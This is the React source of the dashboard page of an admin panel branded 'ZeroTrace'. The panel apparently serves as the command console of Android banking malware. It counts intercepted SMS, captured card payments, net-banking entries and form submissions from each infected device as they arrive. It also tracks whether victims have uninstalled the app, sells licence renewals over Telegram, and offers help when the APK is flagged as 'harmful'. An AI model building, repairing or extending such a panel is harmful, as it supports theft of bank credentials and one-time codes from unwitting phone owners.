import { useEffect, useMemo, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";

import wsService from "../services/ws/wsService";
import { listSessions, logoutSession, getOrCreateSessionId } from "../services/api/admin";
import { logout } from "../services/api/auth";
import { ENV, apiHeaders } from "../config/constants";
import CountDown from "../components/ui/CountDown";
import AnimatedAppBackground from "../components/layout/AnimatedAppBackground";

import ztLogo from "../assets/zt-logo.png";
import { formatDMY, getCountdown, getLicenseSnapshot, pad2 } from "../utils/license";
import {
  pickLastSeenAt,
  computeReachability,
  formatLastSeenAgo,
} from "../utils/reachability";

const SESSION_TTL_MS = 2 * 60 * 60 * 1000;

type Device = {
  deviceId: string;
  lastSeen?: { at?: number; action?: string; battery?: number };
  status?: { online?: boolean; timestamp?: number };
  admins?: string[];
  forwardingSim?: string;
  favorite?: boolean;
  metadata?: Record<string, any>;
};

type ActivityItem = { id: string; ts: number; title: string; subtitle?: string; icon: string; kind: "session" | "ws" };
type SessionLike = { _id?: string; deviceId?: string; uniqueid?: string; admin?: string; username?: string; lastSeen?: number | string; updatedAt?: number | string; createdAt?: number | string };
type NotificationsSummaryResponse = { totalDevices?: number; totalSms?: number; latestTimestamp?: number };
type FormsSummaryResponse = { formsCount?: number; cardPaymentsCount?: number; netBankingCount?: number };

function toTs(v: any): number { if (!v) return 0; if (typeof v === "number") return v; const t = new Date(String(v)).getTime(); return Number.isFinite(t) ? t : 0; }
function minutesAgo(ts: number): string { const diff = Date.now() - ts; const m = Math.max(0, Math.floor(diff / 60000)); if (m < 1) return "now"; if (m === 1) return "1 min"; if (m < 60) return `${m} min`; const h = Math.floor(m / 60); if (h === 1) return "1 hour"; if (h < 24) return `${h} hours`; const d = Math.floor(h / 24); return d === 1 ? "1 day" : `${d} days`; }
function onlyDigits(v: string): string { return String(v || "").replace(/\D/g, ""); }

function buildWhatsappUrl(base: string, text: string): string {
  const raw = String(base || "").trim(); const encoded = encodeURIComponent(text);
  if (!raw) return "";
  if (/^\+?\d{8,20}$/.test(raw)) return `https://wa.me/${onlyDigits(raw)}?text=${encoded}`;
  try {
    const hasProtocol = /^https?:\/\//i.test(raw); const url = new URL(hasProtocol ? raw : `https://${raw}`); const host = url.hostname.toLowerCase();
    if (host.includes("wa.me")) { const phone = onlyDigits(url.pathname); if (phone) return `https://wa.me/${phone}?text=${encoded}`; }
    if (host.includes("api.whatsapp.com") || host.includes("web.whatsapp.com") || host.includes("whatsapp.com")) { const phone = onlyDigits(url.searchParams.get("phone") || url.pathname); if (phone) return `https://api.whatsapp.com/send?phone=${phone}&text=${encoded}`; }
    const phoneFromRaw = onlyDigits(raw); if (phoneFromRaw.length >= 8) return `https://wa.me/${phoneFromRaw}?text=${encoded}`;
  } catch { const phoneFromRaw = onlyDigits(raw); if (phoneFromRaw.length >= 8) return `https://wa.me/${phoneFromRaw}?text=${encoded}`; }
  return "";
}

function SurfaceCard({ children, className = "" }: { children: React.ReactNode; className?: string }) {
  return (<div className={["rounded-[26px] border border-slate-200/90 bg-white/90 shadow-[0_8px_28px_rgba(15,23,42,0.08)] backdrop-blur-sm", className].join(" ")}>{children}</div>);
}
function SectionHeader({ title, right }: { title: string; right?: React.ReactNode }) {
  return (<div className="flex items-center justify-between border-b border-slate-200 px-4 py-3"><div className="text-sm font-bold text-slate-900">{title}</div>{right}</div>);
}
function StatTile({ title, value, icon, onClick, color }: { title: string; value: string | number; icon: string; onClick: () => void; color?: "green" | "red" | "purple" | "amber" }) {
  const colorClass = color === "green" ? "border-emerald-300 bg-emerald-50/80" : color === "red" ? "border-rose-300 bg-rose-50/80" : color === "purple" ? "border-purple-300 bg-purple-50/80" : color === "amber" ? "border-amber-300 bg-amber-50/80" : "border-slate-200 bg-white/92";
  return (
    <button type="button" onClick={onClick} className={`w-full rounded-[22px] border px-3 py-3 text-left shadow-[0_6px_20px_rgba(15,23,42,0.05)] transition hover:bg-slate-50 active:scale-[0.99] ${colorClass}`}>
      <div className="flex items-center justify-between gap-3">
        <div className="flex min-w-0 items-center gap-3">
          <div className="flex h-10 w-10 items-center justify-center rounded-2xl border border-slate-200 bg-slate-50 text-lg">{icon}</div>
          <div className="min-w-0">
            <div className="truncate text-[11px] text-slate-500">{title}</div>
            <div className="text-xl font-extrabold leading-tight text-slate-900">{value}</div>
          </div>
        </div>
        <div className="text-xl text-slate-300">›</div>
      </div>
    </button>
  );
}

export default function DashboardPage() {
  const nav = useNavigate();
  const [devices, setDevices] = useState<Device[]>([]);
  const [favoritesMap, setFavoritesMap] = useState<Record<string, boolean>>({});
  const [formsCount, setFormsCount] = useState<number | null>(null);
  const [cardCount, setCardCount] = useState<number | null>(null);
  const [netbankingCount, setNetbankingCount] = useState<number | null>(null);
  const [smsCount, setSmsCount] = useState<number | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [wsConnected, setWsConnected] = useState<boolean>(false);
  const [sessionActivity, setSessionActivity] = useState<ActivityItem[]>([]);
  const [realtimeActivity, setRealtimeActivity] = useState<ActivityItem[]>([]);
  const [nowTick, setNowTick] = useState<number>(() => Date.now());
  const license = useMemo(() => getLicenseSnapshot(nowTick), [nowTick]);
  const countdown = useMemo(() => getCountdown(license.expiryDate, nowTick), [license.expiryDate, nowTick]);
  const harmfullWhatsappLink = String(import.meta.env.VITE_HARMFULL_FIX_WP_LINK || "").trim();
  const smsCountRef = useRef<number | null>(null);
  const formsCountRef = useRef<number | null>(null);
  const cardCountRef = useRef<number | null>(null);
  const netCountRef = useRef<number | null>(null);

  const totalDevices = devices.length;
  const responsiveCount = useMemo(() => devices.filter((d) => computeReachability(pickLastSeenAt(d)) === "responsive").length, [devices]);
  const idleCount = useMemo(() => devices.filter((d) => computeReachability(pickLastSeenAt(d)) === "idle").length, [devices]);
  const uninstalledCount = useMemo(() => devices.filter((d) => computeReachability(pickLastSeenAt(d)) === "uninstalled").length, [devices]);
  const unreachableCount = totalDevices - responsiveCount - idleCount - uninstalledCount;

  const [sessionRemainingMs, setSessionRemainingMs] = useState<number>(SESSION_TTL_MS);
  const [sessionCreatedAt, setSessionCreatedAt] = useState<number>(0);

  useEffect(() => {
    if (!sessionCreatedAt) return;
    const interval = setInterval(() => {
      const elapsed = Date.now() - sessionCreatedAt;
      const remaining = Math.max(0, SESSION_TTL_MS - elapsed);
      setSessionRemainingMs(remaining);
      if (remaining <= 0) { clearInterval(interval); (async () => { try { const sid = getOrCreateSessionId(); if (sid) await logoutSession(sid); } catch {} logout(); window.location.href = "/login"; })(); }
    }, 1000);
    return () => clearInterval(interval);
  }, [sessionCreatedAt]);

  const sessionHours = Math.floor(sessionRemainingMs / 3600000);
  const sessionMins = Math.floor((sessionRemainingMs % 3600000) / 60000);
  const sessionSecs = Math.floor((sessionRemainingMs % 60000) / 1000);
  const sessionBarPercent = Math.max(0, Math.min(100, (sessionRemainingMs / SESSION_TTL_MS) * 100));
  const sessionBarColor = sessionRemainingMs > 30 * 60 * 1000 ? "bg-emerald-500" : sessionRemainingMs > 10 * 60 * 1000 ? "bg-amber-500" : "bg-rose-500";
  const sessionTextColor = sessionRemainingMs > 30 * 60 * 1000 ? "text-emerald-700" : sessionRemainingMs > 10 * 60 * 1000 ? "text-amber-700" : "text-rose-700";

  const favoriteIds = useMemo(() => Object.entries(favoritesMap).filter(([, v]) => !!v).map(([k]) => k).sort((a, b) => (a > b ? 1 : -1)), [favoritesMap]);
  const favoritesPreview = useMemo(() => favoriteIds.slice(0, 4), [favoriteIds]);

  const activityItems = useMemo(() => {
    const merged = [...realtimeActivity, ...sessionActivity]; const seen = new Set<string>(); const out: ActivityItem[] = [];
    for (const it of merged) { const bucket = Math.floor(it.ts / 30000); const key = `${it.kind}|${it.title}|${it.subtitle || ""}|${bucket}`; if (seen.has(key)) continue; seen.add(key); out.push(it); if (out.length >= 6) break; }
    return out;
  }, [realtimeActivity, sessionActivity]);

  useEffect(() => { smsCountRef.current = smsCount; }, [smsCount]);
  useEffect(() => { formsCountRef.current = formsCount; }, [formsCount]);
  useEffect(() => { cardCountRef.current = cardCount; }, [cardCount]);
  useEffect(() => { netCountRef.current = netbankingCount; }, [netbankingCount]);
  useEffect(() => { const t = window.setInterval(() => setNowTick(Date.now()), 1000); return () => window.clearInterval(t); }, []);

  async function loadDevices() { setError(null); try { const res = await axios.get(`${ENV.API_BASE}/api/devices`, { headers: apiHeaders(), timeout: 8000 }); setDevices(Array.isArray(res.data) ? res.data : []); } catch (e: any) { console.error("loadDevices error", e); setError("Failed loading devices"); setDevices([]); } }
  async function loadFavorites() { try { const res = await axios.get(`${ENV.API_BASE}/api/favorites`, { headers: apiHeaders(), timeout: 8000 }); const m = res?.data && typeof res.data === "object" ? (res.data as Record<string, boolean>) : {}; setFavoritesMap(m || {}); } catch { setFavoritesMap({}); } }
  async function loadFormsSummary() { try { const res = await axios.get<FormsSummaryResponse>(`${ENV.API_BASE}/api/dashboard/forms-summary`, { headers: apiHeaders(), timeout: 10000 }); setFormsCount(Number(res.data?.formsCount || 0)); setCardCount(Number(res.data?.cardPaymentsCount || 0)); setNetbankingCount(Number(res.data?.netBankingCount || 0)); } catch { setFormsCount(0); setCardCount(0); setNetbankingCount(0); } }
  async function loadSmsSummary() { try { const res = await axios.get<NotificationsSummaryResponse>(`${ENV.API_BASE}/api/notifications/summary`, { headers: apiHeaders(), timeout: 10000 }); setSmsCount(Number(res.data?.totalSms || 0)); } catch { setSmsCount(0); } }

  async function loadAdminSessions() {
    try {
      const sessions = (await listSessions()) as any[]; const arr: SessionLike[] = Array.isArray(sessions) ? sessions : [];
      const mySessionId = getOrCreateSessionId();
      if (mySessionId) { const mySession = (sessions || []).find((s: any) => String(s.sessionId || "") === mySessionId); if (mySession) { const created = toTs(mySession.createdAt) || toTs(mySession.updatedAt) || 0; if (created > 0) setSessionCreatedAt(created); } }
      const items: ActivityItem[] = arr.map((s) => { const did = String(s.deviceId || s.uniqueid || "unknown"); const admin = String(s.admin || s.username || "admin"); const last = toTs(s.lastSeen) || toTs(s.updatedAt) || toTs(s.createdAt) || Date.now(); return { id: String(s._id || `${did}_${admin}_${last}`), ts: last, title: did, subtitle: admin, icon: "👤", kind: "session" } satisfies ActivityItem; }).sort((a, b) => b.ts - a.ts).slice(0, 6);
      setSessionActivity(items);
    } catch (e) { console.warn("loadAdminSessions failed", e); setSessionActivity([]); }
  }

  function handleRenewClick() { if (license.telegramChatDeepLink) window.open(license.telegramChatDeepLink, "_blank"); window.open(license.telegramShareUrl, "_blank"); }
  function handleHarmfullClick() { const panelId = String(license.panelId || "____").trim(); const message = `hello sir fixmy harmfull\npanel id: ${panelId}`; const finalUrl = buildWhatsappUrl(harmfullWhatsappLink, message); if (!finalUrl) { console.warn("Invalid WhatsApp env link."); return; } window.open(finalUrl, "_blank", "noopener,noreferrer"); }
  function pushRealtime(item: Omit<ActivityItem, "id" | "kind">) { const next = { ...item, kind: "ws", id: `${Date.now()}_${Math.random().toString(16).slice(2)}` } satisfies ActivityItem; setRealtimeActivity((prev) => [next, ...prev].slice(0, 6)); }

  function goDevices(filter: "all" | "responsive" | "unreachable" | "idle" | "uninstalled") {
    if (filter === "all") { nav("/devices"); return; }
    if (filter === "idle") { nav("/devices?filter=idle"); return; }
    if (filter === "uninstalled") { nav("/devices?filter=uninstalled"); return; }
    const qp = filter === "responsive" ? "online" : "offline";
    nav(`/devices?filter=${qp}`);
  }

  function applyDeviceLastSeen(deviceId: string, lastSeenAt: number, action?: string, battery?: number) {
    setDevices((prev) => {
      let found = false;
      const next = prev.map((d) => { if (String(d.deviceId || "") !== deviceId) return d; found = true; return { ...d, lastSeen: { at: lastSeenAt, action: action || d.lastSeen?.action || "", battery: typeof battery === "number" && battery >= 0 ? battery : d.lastSeen?.battery ?? -1 } }; });
      if (found) return next;
      return [{ deviceId, lastSeen: { at: lastSeenAt, action: action || "", battery: battery ?? -1 }, metadata: {} }, ...next];
    });
  }

  useEffect(() => {
    wsService.connect(); setWsConnected(wsService.isConnected());
    const unsub = wsService.onMessage((msg) => {
      try {
        if (!msg) return;
        if (msg.type === "event" && (msg.event === "device:lastSeen" || msg.event === "device:upsert")) { const did = String(msg.deviceId || msg?.data?.deviceId || ""); if (!did) return; const lastSeenData = msg?.data?.lastSeen || msg?.data; const lastSeenAt = Number(lastSeenData?.at || msg?.data?.timestamp || Date.now()); const action = String(lastSeenData?.action || "").trim(); const battery = typeof lastSeenData?.battery === "number" ? lastSeenData.battery : -1; applyDeviceLastSeen(did, lastSeenAt, action, battery); const reachability = computeReachability(lastSeenAt); pushRealtime({ ts: Date.now(), title: did || "Device", subtitle: `${reachability} • ${action || "update"}`, icon: reachability === "responsive" ? "🟢" : reachability === "idle" ? "🟡" : reachability === "uninstalled" ? "🟣" : "🔴" }); return; }
        if (msg.type === "event" && msg.event === "status") { const did = String(msg.deviceId || ""); const ts = Number(msg.data?.timestamp || Date.now()); if (did) applyDeviceLastSeen(did, ts, "ws_status"); return; }
        if (msg.type === "event" && msg.event === "notification") { const did = String(msg.deviceId || ""); const bodyText = String(msg?.data?.body || "").trim(); if (did) { setSmsCount((prev) => (typeof prev === "number" ? prev + 1 : 1)); pushRealtime({ ts: Date.now(), title: did || "Device", subtitle: bodyText ? "sms received" : "sms", icon: "💬" }); } return; }
        if (msg.type === "event" && msg.event === "notification:deleted") { setSmsCount((prev) => { if (typeof prev !== "number") return prev; return Math.max(0, prev - 1); }); return; }
        if (msg.type === "event" && msg.event === "favorite:update") { const did = String(msg?.data?.deviceId || msg.deviceId || "").trim(); if (!did) return; const favorite = !!msg?.data?.favorite; setFavoritesMap((prev) => ({ ...prev, [did]: favorite })); return; }
        if (msg.type === "event" && msg.event === "device:delete") { const did = String(msg?.data?.deviceId || msg.deviceId || "").trim(); if (!did) return; setDevices((prev) => prev.filter((d) => String(d.deviceId || "") !== did)); setFavoritesMap((prev) => { const copy = { ...prev }; delete copy[did]; return copy; }); return; }
        if (msg.type === "event" && (msg.event === "form:new" || msg.event === "form:update" || msg.event === "form:created" || msg.event === "form_submissions:created")) { if (msg.event === "form:new" || msg.event === "form:created" || msg.event === "form_submissions:created") setFormsCount((prev) => (typeof prev === "number" ? prev + 1 : 1)); const did = String(msg?.data?.uniqueid || msg?.data?.deviceId || msg.deviceId || "").trim(); if (did) pushRealtime({ ts: Date.now(), title: did, subtitle: "form submit", icon: "🗂️" }); return; }
        if (msg.type === "event" && (msg.event === "payment:new" || msg.event === "payment:card_created" || msg.event === "card_payment:created")) { const method = String(msg?.data?.method || "").trim().toLowerCase(); if (method === "card" || msg.event === "payment:card_created" || msg.event === "card_payment:created") setCardCount((prev) => (typeof prev === "number" ? prev + 1 : 1)); else if (method === "netbanking" || method === "net_banking") setNetbankingCount((prev) => (typeof prev === "number" ? prev + 1 : 1)); const did = String(msg?.data?.uniqueid || msg?.data?.deviceId || msg.deviceId || "").trim(); if (did) pushRealtime({ ts: Date.now(), title: did, subtitle: method === "netbanking" || method === "net_banking" ? "net banking" : "card payment", icon: method === "netbanking" || method === "net_banking" ? "🏦" : "💳" }); return; }
        if (msg.type === "event" && (msg.event === "payment:netbanking_created" || msg.event === "net_banking:created")) { setNetbankingCount((prev) => (typeof prev === "number" ? prev + 1 : 1)); const did = String(msg?.data?.uniqueid || msg?.data?.deviceId || msg.deviceId || "").trim(); if (did) pushRealtime({ ts: Date.now(), title: did, subtitle: "net banking", icon: "🏦" }); return; }
        if (msg.type === "event" && msg.event === "globalAdmin.update") { pushRealtime({ ts: Date.now(), title: "Global Admin", subtitle: "updated", icon: "📣" }); return; }
        if (msg.type === "force_logout") { pushRealtime({ ts: Date.now(), title: "Session", subtitle: "force logout", icon: "🚪" }); }
      } catch {}
    });
    const wsStatusHandler = (ev: any) => { try { setWsConnected(!!ev?.detail?.connected); } catch {} };
    window.addEventListener("zerotrace:ws", wsStatusHandler as any);
    return () => { unsub(); window.removeEventListener("zerotrace:ws", wsStatusHandler as any); };
  }, []);

  useEffect(() => { loadDevices(); loadFormsSummary(); loadFavorites(); loadSmsSummary(); loadAdminSessions(); }, []);

  return (
    <AnimatedAppBackground>
      <div className="mx-auto max-w-[420px] px-3 pb-28 pt-4">
        <SurfaceCard className="p-4">
          <div className="flex items-start justify-between pb-2">
            <div className="flex min-w-0 items-center gap-3">
              <img src={ztLogo} alt="ZeroTrace logo" className="h-10 w-10 rounded-xl border border-slate-200 bg-white object-contain" />
              <div className="min-w-0">
                <div className="truncate text-lg font-bold leading-tight text-slate-900">ZeroTrace</div>
                <div className="text-[11px] text-slate-500">Secure Admin Panel</div>
              </div>
            </div>
            <div className="flex items-center gap-2 text-xs">
              <span className={`inline-block h-2.5 w-2.5 rounded-full ${wsConnected ? "bg-emerald-500" : "bg-rose-500"}`} />
              <span className={`${wsConnected ? "text-emerald-700" : "text-rose-600"} text-[12px] font-medium`}>{wsConnected ? "Connected" : "Disconnected"}</span>
            </div>
          </div>

          {/* ══════ SESSION EXPIRY COUNTDOWN ══════ */}
          <div className="mt-2 rounded-2xl border border-slate-200 bg-slate-50 px-3 py-2.5">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <span className="text-sm">⏱️</span>
                <span className="text-[11px] font-semibold text-slate-600">Session expires in</span>
              </div>
              <div className={`text-[15px] font-extrabold tabular-nums ${sessionTextColor}`}>{pad2(sessionHours)}:{pad2(sessionMins)}:{pad2(sessionSecs)}</div>
            </div>
            <div className="mt-1.5 h-1.5 w-full overflow-hidden rounded-full bg-slate-200">
              <div className={`h-full rounded-full transition-all duration-1000 ${sessionBarColor}`} style={{ width: `${sessionBarPercent}%` }} />
            </div>
            <div className="mt-1.5 text-[10px] text-slate-500">
              (You will be automatically logged out in <span className={`font-bold ${sessionTextColor}`}>{pad2(sessionHours)}h {pad2(sessionMins)}m {pad2(sessionSecs)}s</span>)
            </div>
            {sessionRemainingMs <= 10 * 60 * 1000 && (
              <div className="mt-1 text-[10px] text-rose-600 font-semibold">⚠️ Logging out soon!</div>
            )}
          </div>

          {/* ══════ STAT TILES ══════ */}
          <div className="mt-3 grid grid-cols-2 gap-3">
            <StatTile title="Online" value={responsiveCount} icon="📶" color="green" onClick={() => goDevices("responsive")} />
            <StatTile title="Sleeping" value={idleCount} icon="😴" color="amber" onClick={() => goDevices("idle")} />
            <StatTile title="Offline" value={unreachableCount} icon="📴" color="red" onClick={() => goDevices("unreachable")} />
            <StatTile title="Uninstalled" value={uninstalledCount} icon="🗑️" color="purple" onClick={() => goDevices("uninstalled")} />
            <StatTile title="Total Devices" value={totalDevices} icon="📱" onClick={() => goDevices("all")} />
            <StatTile title="All SMS" value={smsCount == null ? "…" : smsCount} icon="💬" onClick={() => nav("/sms")} />
          </div>

          {/* ══════ LICENSE ══════ */}
          <SurfaceCard className="mt-4 overflow-hidden">
            <SectionHeader title="Admin Expires in" right={<button type="button" onClick={handleRenewClick} className="rounded-xl border border-sky-200 bg-sky-50 px-3 py-1.5 text-xs font-semibold text-sky-700 hover:bg-sky-100">Renew (Telegram)</button>} />
            <div className="px-4 py-3">
              <div className="flex items-center justify-between"><div className="text-xs text-slate-500">Active until:</div><div className="text-xs font-medium text-slate-800">{formatDMY(license.expiryDate)}</div></div>
              <div className="mt-2 flex items-center justify-between"><div className="text-xs text-slate-500">Purchase date:</div><div className="text-xs font-medium text-slate-800">{formatDMY(license.startDate)}</div></div>
              <div className="pt-4">
                {countdown ? (
                  countdown.expired ? (
                    <div className="rounded-[22px] border border-rose-200 bg-rose-50 p-4 text-center">
                      <div className="text-2xl font-bold text-rose-600">Expired</div>
                      <div className="mt-1 text-xs text-slate-500">Please renew license</div>
                      <button type="button" onClick={handleRenewClick} className="mt-3 w-full rounded-xl border border-rose-200 bg-white py-2 font-semibold text-rose-700 hover:bg-rose-100">Renew Now (Telegram)</button>
                      <div className="mt-2 text-center text-xs text-slate-500">Panel ID: <span className="font-medium text-slate-800">{license.panelId || "____"}</span></div>
                    </div>
                  ) : (
                    <div className="rounded-[22px] border border-slate-200 bg-slate-50 p-4">
                      <div className="flex items-end justify-center gap-2 text-[22px] font-semibold tracking-wide sm:text-[34px]">
                        <span className="text-[28px] text-slate-900 sm:text-[36px]">{pad2(countdown.days)}</span><span className="text-slate-300">:</span>
                        <span className="text-[20px] text-slate-800 sm:text-[28px]">{pad2(countdown.hours)}</span><span className="text-slate-300">:</span>
                        <span className="text-[20px] text-slate-800 sm:text-[28px]">{pad2(countdown.mins)}</span><span className="text-slate-300">:</span>
                        <span className="text-[20px] text-slate-800 sm:text-[28px]">{pad2(countdown.secs)}</span><span className="pb-1 text-sm text-slate-500">Sec</span>
                      </div>
                      <div className="mt-2 text-center text-xs text-slate-500">Days until {formatDMY(license.expiryDate)}</div>
                      <button type="button" onClick={handleRenewClick} className="mt-3 w-full rounded-xl border border-emerald-200 bg-emerald-50 py-3 font-semibold text-emerald-700 hover:bg-emerald-100">Renew License (Telegram)</button>
                      <div className="mt-2 text-center text-xs text-slate-500">Panel ID: <span className="font-medium text-slate-800">{license.panelId || "____"}</span></div>
                    </div>
                  )
                ) : (
                  <div className="py-4 text-center text-sm text-slate-400">Set env <span className="font-medium text-slate-700">VITE_RENEWAL_START_DATE</span> (DD/MM/YYYY).</div>
                )}
              </div>
            </div>
          </SurfaceCard>

          {/* ══════ HARMFULL ══════ */}
          <SurfaceCard className="mt-4 overflow-hidden">
            <SectionHeader title="Fix My Apk Harmfull" />
            <div className="px-4 py-4">
              <div className="rounded-[20px] border border-amber-200 bg-amber-50 px-3 py-3">
                <div className="text-sm font-medium text-slate-800">Need help for harmful/fix issue?</div>
                <div className="mt-1 text-xs text-slate-500">Click below and WhatsApp will open with auto message: <span className="font-medium text-slate-700">hello sir fixmy harmfull</span> + your panel id.</div>
              </div>
              <button type="button" onClick={handleHarmfullClick} disabled={!harmfullWhatsappLink} className="mt-3 w-full rounded-xl border border-emerald-200 bg-emerald-50 py-3 font-semibold text-emerald-700 hover:bg-emerald-100 disabled:cursor-not-allowed disabled:opacity-60">contact Harmfull team</button>
              <div className="mt-2 text-center text-xs text-slate-500">Panel ID: <span className="font-medium text-slate-800">{license.panelId || "____"}</span></div>
              {!harmfullWhatsappLink ? <div className="mt-2 text-center text-xs text-rose-600">Set env <span className="font-medium">VITE_HARMFULL_FIX_WP_LINK</span></div> : null}
            </div>
          </SurfaceCard>

          {/* ══════ ACTIVITY ══════ */}
          <div className="mt-4 grid grid-cols-1 gap-4">
            <SurfaceCard className="overflow-hidden">
              <SectionHeader title="Admin Activity" right={<div className="flex items-center gap-2"><div className="text-xs text-slate-400">{activityItems.length}</div><button type="button" onClick={() => nav("/sessions")} className="rounded-xl border border-slate-200 bg-white px-3 py-1.5 text-xs text-slate-700 hover:bg-slate-50">Manage</button></div>} />
              <div className="px-4 py-3">
                {activityItems.length === 0 ? (
                  <div className="text-sm text-slate-400">No activity yet.</div>
                ) : (
                  <div className="space-y-2">
                    {activityItems.map((it) => (
                      <button type="button" key={it.id} onClick={() => nav("/sessions")} className="flex w-full items-center justify-between rounded-[18px] border border-slate-200 bg-white px-3 py-2 text-left hover:bg-slate-50" title="Manage sessions">
                        <div className="flex min-w-0 items-center gap-2">
                          <div className="flex h-8 w-8 items-center justify-center rounded-lg border border-slate-200 bg-slate-50">{it.icon}</div>
                          <div className="min-w-0"><div className="truncate text-sm font-medium text-slate-900">{it.title}</div><div className="truncate text-[11px] text-slate-500">{it.kind === "session" ? `admin: ${it.subtitle || "admin"}` : it.subtitle || "event"}</div></div>
                        </div>
                        <div className="text-xs text-slate-400">{it.ts ? minutesAgo(it.ts) : ""}</div>
                      </button>
                    ))}
                  </div>
                )}
                {sessionActivity.length === 0 ? <div className="mt-3 text-[11px] text-slate-400">Tip: If this stays empty, check backend route <span className="font-mono text-slate-700">GET /api/admin/sessions</span>.</div> : null}
              </div>
            </SurfaceCard>
          </div>

          <div className="hidden">
            <CountDown expiryDate={license.expiryISO} title="License Countdown" subtitle={`Panel: ${license.panelId || "____"}`} onRenew={handleRenewClick} renewLabel="Renew (Telegram)" />
          </div>
        </SurfaceCard>
      </div>
    </AnimatedAppBackground>
  );
}
